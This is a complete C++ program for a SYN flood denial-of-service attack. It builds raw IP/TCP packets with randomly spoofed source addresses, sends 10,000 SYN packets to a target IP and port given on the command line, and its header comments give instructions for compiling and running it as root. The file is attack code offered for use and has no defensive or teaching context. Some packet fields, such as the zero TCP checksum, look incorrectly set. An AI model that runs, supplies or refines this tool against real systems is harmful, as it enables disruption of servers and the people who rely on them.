// Compile: g++ -o syn_flood syn_flood.cpp -lpthread
// Run: sudo ./syn_flood <target_ip> <port>
// Requires: root privileges (raw sockets)

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>

class SYNFlooder {
private:
    int sock;
    struct sockaddr_in target;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    SYNFlooder(const char* ip, int port) {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock < 0) { perror("socket"); exit(1); }
        
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        target.sin_addr.s_addr = inet_addr(ip);
    }
    
    void attack(int count) {
        char packet[4096];
        struct iphdr* ip = (struct iphdr*)packet;
        struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
        
        srand(time(NULL));
        
        for (int i = 0; i < count; i++) {
            memset(packet, 0, 4096);
            
            ip->ihl = 5;
            ip->version = 4;
            ip->tos = 0;
            ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
            ip->id = htons(rand() % 65535);
            ip->frag_off = 0;
            ip->ttl = 64;
            ip->protocol = IPPROTO_TCP;
            ip->saddr = rand();
            ip->daddr = target.sin_addr.s_addr;
            ip->check = checksum(ip, sizeof(struct iphdr));
            
            tcp->source = htons(rand() % 65535);
            tcp->dest = target.sin_port;
            tcp->seq = rand();
            tcp->ack_seq = 0;
            tcp->doff = 5;
            tcp->syn = 1;
            tcp->window = htons(65535);
            tcp->check = 0;
            
            sendto(sock, packet, ip->tot_len, 0, 
                   (struct sockaddr*)&target, sizeof(target));
        }
    }
    
    ~SYNFlooder() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <target_ip> <port>\n";
        return 1;
    }
    SYNFlooder flooder(argv[1], atoi(argv[2]));
    flooder.attack(10000);
    return 0;
}
